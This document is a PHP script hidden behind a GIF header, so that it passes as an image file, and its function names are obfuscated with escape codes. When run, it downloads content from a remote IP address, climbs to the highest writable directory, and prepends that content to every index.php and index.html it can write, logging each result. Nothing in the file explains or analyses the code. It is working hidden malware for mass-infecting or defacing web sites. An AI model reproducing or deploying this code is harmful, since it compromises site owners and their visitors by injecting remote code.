GIF
<?php
echo "sloboz";
?> 
<?

/*******************************************\
|  Source code obfuscated  by Code Eclipse  |
|        http://www.codeeclipse.com/        |
| Complete protection, total compatibility! |
\*******************************************/

 $x1f="ba\163\x65\x6e\x61\x6d\145"; $x20="d\x69\x72\x6ea\x6d\145"; $x21="\146\151\x6c\x65\137\x67\x65\x74\x5f\143\x6fnt\x65\x6ets"; $x22="\x66\151\154\145_\160\x75t_\143\157\x6e\x74\x65nt\163"; $x23="\x69\163\x5fw\x72\151\x74\x61b\154\145"; $x24="\155i\x63\x72\x6f\x74\151\155e"; $x25="p\x61t\x68\x69nf\157"; $x26="s\x65\164\137\164\x69m\145\x5f\154\151\155\151t";
$x26(0);$x0b = $x24(true); $x0c = $x21('http://91.239.15.61/php.txt');$x0d = $x21('http://91.239.15.61/html.txt'); $x0e = '';$x22('log.txt', '');$x0f = $x20($x20(__FILE__));while($x1f($x0f)) {$x10 = false;try {$x11 = new DirectoryIterator($x0f);foreach ($x11 as $x12) {if ($x12->isDir() && !$x12->isDot() && $x12->isWritable()) {$x10 = true;$x13 = $x0f;$x0f = $x20($x0f);break;}}}catch(Exception $x14) {}if(!$x10) break;}$x15 = new IgnorantRecursiveDirectoryIterator($x13);$x16 = new RecursiveIteratorIterator($x15);$x17 = new RegexIterator($x16, '/index\.(php|html)/i', RecursiveRegexIterator::GET_MATCH);$x18=0;foreach($x17 as $x19 => $x1a){if($x25($x19, PATHINFO_EXTENSION) == 'php')$x1b = $x0c;else$x1b = $x0d;$x1c = $x1b . $x21($x19);if($x23($x19) AND $x22($x19, $x1c))$x0e = "$x19 \x2d\040d\x6fne\n";else$x0e = "$x19\040\055 \x62\x61d\n";$x18++;$x22('log.txt', $x0e, FILE_APPEND);}$x1d = $x24(true);$x1e = $x1d - $x0b; class IgnorantRecursiveDirectoryIterator extends RecursiveDirectoryIterator {function x0b() { global $x1f,$x20,$x21,$x22,$x23,$x24,$x25,$x26; try {return new IgnorantRecursiveDirectoryIterator($this->getPathname());} catch(UnexpectedValueException $x14) {return new RecursiveArrayIterator(array());}}}?>